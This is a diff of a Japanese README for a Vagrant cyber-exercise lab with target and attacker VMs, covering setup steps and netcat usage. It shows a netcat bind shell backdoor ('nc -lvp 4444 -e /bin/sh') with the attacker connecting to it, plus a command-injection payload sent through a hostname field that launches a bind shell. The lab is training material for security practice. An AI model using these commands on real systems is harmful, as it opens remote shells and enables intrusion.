@@ -22,11 +22,13 @@ Target OSに設置されたウェブサーバ は、入力されたホスト名�
 ## Prerequisite
 * Vagrant
   * Plugin: landrush, vagrant-vbguest
+  * Packer
 
 ## Installation　　
 * Vagrant　　　
-1. $ vagrant up --provision　　　   
-2. $ vagrant landrush ls　　　   
+1. [CyExc用box](https://github.com/CyExc/CyExc/tree/master/2017/CyExc_Box)を作成する。
+2. $ vagrant up --provision　　　   
+3. $ vagrant landrush ls　　　   
 ゲストOSのIPアドレスとhostnameが以下のようにマッチしていない場合は、vagrant destroyを行う必要がある。　　　   
 ```
 target.cyexc-target            192.168.33.10
@@ -34,12 +36,12 @@ target.cyexc-target            192.168.33.10
 attacker.cyexc-attacker        192.168.33.20
 20.33.168.192.in-addr.arpa     attacker.cyexc-attacker
 ````
-3. target側のOS起動
+4. target側のOS起動
 $ vagrant ssh target  <br>
 	i. $ cd target/　　　    <br>
 	ii.$ sudo docker-compose up --build  <br>
 	iii. Browse to ht&#8203;tp://target.cyexc-target/  <br>
-4. attacker側のOS起動
+5. attacker側のOS起動
 $ vagrant ssh attacker  <br>
 	i. $ cd attacker/　　　      <br>
 	ii.$ sudo docker-compose up --build  <br>
@@ -47,23 +49,42 @@ $ vagrant ssh attacker  <br>
 ## nc (netcat)
 対象サーバとTCPまたはUDPで接続して、データ送受信するためのバックエンドツール。また、ポートスキャンツールやサービスデーモンとして特定ポートでListenさせることができる。
 ```
-usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]
-	  [-P proxy_username] [-p source_port] [-q seconds] [-s source]
-	  [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]
-	  [-x proxy_address[:port]] [destination] [port]
+vagrant@target:~$ nc -h
+connect to somewhere:	nc [-options] hostname port[s] [ports] ...
+listen for inbound:	nc -l -p port [-options] [hostname] [port]
+options:
+	-c shell commands	as `-e'; use /bin/sh to exec [dangerous!!]
+	-e filename		program to exec after connect [dangerous!!]
 ```
+
+* netcat-traditionalへの切り替え
+```
+vagrant@target:~$ sudo update-alternatives --config nc
+There are 2 choices for the alternative nc (providing /bin/nc).
+
+  Selection    Path                 Priority   Status
+------------------------------------------------------------
+* 0            /bin/nc.openbsd       50        auto mode
+  1            /bin/nc.openbsd       50        manual mode
+  2            /bin/nc.traditional   10        manual mode
+
+Press enter to keep the current choice[*], or type selection number: 2
+```
+
 * Target OSでport=4444をサービスデーモンとしListen  <br>
 ```
 vagrant@target:~$ sudo nc -lvp  4444 -e /bin/sh
 listening on [any] 4444 ...
 connect to [192.168.33.10] from attacker.cyexc-attacker [192.168.33.20] 33086
 ```
+
 * Attacker OSでバックドア確認  <br>
 ```
 vagrant@attacker:~$ nc target.cyexc-target 4444
 pwd
 /home/vagrant
 ```
+
 * WEBサーバにGETリクエストを送信  <br>
 ```
 vagrant@attacker:~$ echo -en "GET / HTTP/1.1\n\n" | nc target.cyexc-target 80
@@ -95,7 +116,7 @@ ht&#8203;tp://target.cyexc-target/アクセス時のスクリーンショット
 	8080/tcp open  http-proxy
 	MAC Address: 08:00:27:83:ED:1B (Cadmus Computer Systems)
 	```
-	
+
 	ii. `8.8.8.8;echo 'cyexc' | sudo -S python bind_shell.py`のリクエスト送信でBind Shell起動する。  <br>
 	Attacker OSで、nmapを用いてTarget OSのポートスキャンすると、ポート443がOPENしていることがわかる。  <br>
 	```
